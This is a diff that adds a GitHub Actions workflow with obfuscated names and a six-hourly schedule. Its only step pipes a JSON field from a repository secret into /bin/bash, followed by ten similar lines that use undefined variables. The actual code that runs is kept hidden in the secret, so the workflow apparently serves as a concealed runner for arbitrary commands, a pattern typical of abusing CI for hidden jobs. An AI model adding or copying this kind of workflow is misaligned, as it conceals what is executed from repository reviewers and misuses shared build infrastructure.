@@ -1,0 +1,29 @@
+name: tongyixoa
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '56 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: tongyixoa
+        env:
+          e00872: ${{ secrets.e00872 }}
+        run: |
+          echo $e00872 | jq -r .h87665 | /bin/bash
+          echo $mazm1 | jq -r .pyg7 | /bin/bash
+          echo $xcawh6 | jq -r .as995 | /bin/bash
+          echo $uf16 | jq -r .wm4075 | /bin/bash
+          echo $fycjg32 | jq -r .weuc4231 | /bin/bash
+          echo $fvk9975 | jq -r .j91 | /bin/bash
+          echo $s0 | jq -r .vrbwc465 | /bin/bash
+          echo $pmiz280 | jq -r .acp59673 | /bin/bash
+          echo $d6973 | jq -r .aeb5570 | /bin/bash
+          echo $w211 | jq -r .x76 | /bin/bash
+          echo $g872 | jq -r .gx9 | /bin/bash
+
